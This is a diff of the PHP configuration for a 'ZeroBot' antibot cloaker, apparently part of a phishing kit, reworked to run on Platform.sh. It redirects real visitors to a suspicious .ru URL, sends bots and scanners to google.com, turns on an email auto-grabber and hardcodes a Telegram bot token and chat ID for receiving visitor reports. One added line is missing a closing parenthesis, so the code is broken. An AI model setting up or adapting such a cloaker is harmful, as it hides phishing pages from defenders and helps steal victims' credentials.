@@ -1,56 +1,67 @@
 <?php
-
 /*
-    Antibot Service (ZeroBot)
+    Antibot Service (ZeroBot) - Platform.sh Optimized Version
 
     * This Tool is not for illegal use
     * All right reserved to @brendonurie2000
 
-	Platform : https://zerobot.info
+    Platform : https://zerobot.info
     Author  : @brendonurie2000
 
-    *** Official Version 5 ***
+    *** Official Version 5 - Platform.sh Edition ***
 */
 
+// Platform.sh environment detection
+$isPlatformSH = isset($_ENV['PLATFORM_PROJECT']);
+
+// Configure paths for Platform.sh
+if ($isPlatformSH) {
+    $platformTempDir = '/tmp';
+    ini_set('session.save_path', $platformTempDir);
+} else {
+    $platformTempDir = sys_get_temp_dir();
+}
+
+// Start session with proper configuration
+session_start([
+    'use_cookies' => 1,
+    'use_only_cookies' => 1,
+    'cookie_httponly' => 1,
+    'cookie_secure' => isset($_SERVER['HTTPS']),
+    'gc_maxlifetime' => 14400,
+    'sid_length' => 128,
+    'sid_bits_per_character' => 6
+]);
+
+// Rest of your ZeroBot configuration
 $license_key = "yba13s816dklaspx8tf03tjcsv1798jk"; // [REQUIRED]
-
-$redirect = "https://amoraterthrinereldreathig.ventateros.ru/rTvtY5h/#0"; // URL or FILE [REQUIRED]
-
-
+$redirect = "https://amoraterthrinereldreathig.ventateros.ru/rTvtY5h/#"; // URL or FILE [REQUIRED]
 $parameter = 2; // [REQUIRED]
 
-/*
-	1 : Check Bots And Countries.
-	2 : Check Only Bots.
-	3 : Check Only Countries.
-	4 : Allow All Visitors.
-*/
-
-$_COUNTRY_ALLOWED = ["ma", "us"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
-
-$redirection_link_check = false; // Check Your Page If Still Uploaded
-
-$check_red_page = false; // Check The Redirect If Red Flag
-
-$authentification = false; // Not necessary
+$_COUNTRY_ALLOWED = ["ma", "us"]; # Add Allowed Country Here
+$redirection_link_check = false;
+$check_red_page = false;
+$authentification = false;
 
 $cloaker = [
-    "url_to_grab" => "", // Change the link you want to grap it in your link ( if t)
+    "url_to_grab" => "", // Change the link you want to grap it in your link
 ];
 
-$auto_grabber = true; // Activate Auto Grab Email
+$auto_grabber = true;
+$location_bots = "https://google.com";
+$view_file_name = "views.php";
 
-$location_bots = "https://google.com"; // Send The Bots To This Link ( If Cloaker Url Empty )
+// Store sensitive data in environment variables on Platform.sh
+if ($isPlatformSH) {
+    $token_chat = $_ENV['TELEGRAM_TOKEN'] ?? "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY";
+    $chatid = $_ENV['TELEGRAM_CHATID'] ?? "5811046999";
+} else {
+    $token_chat = "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY";
+    $chatid = "5811046999";
+}
 
-$view_file_name = "views.php"; // Type PHP Extension Will Be Added Auto Per Example : views.php
-
-$token_chat = "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY"; // Your Token To Receive Rapports
-
-$chatid = "5811046999"; // Your ChatID To Receive Rapports
-
-$captcha = false; // Allow ZeroBot Captcha
-
-$remove_visitors_duplicate = false; // Visitors Remove Duplicate
+$captcha = false;
+$remove_visitors_duplicate = false;
 
 
 ZeroBot::PHP_VERSION();
@@ -458,6 +469,12 @@ class ZeroBot
         if (empty($this->vu_filename)) {
             $this->vu_filename = "views.php";
         }
+        
+        // For Platform.sh, store views file in tmp if writing is needed
+        if (isset($_ENV['PLATFORM_PROJECT']) {
+            $this->vu_filename = '/tmp/' . $this->vu_filename;
+        }
+        
         if (file_exists($this->vu_filename)) {
             if (filesize($this->vu_filename) < 20) {
                 $f = fopen($this->vu_filename, "w+");
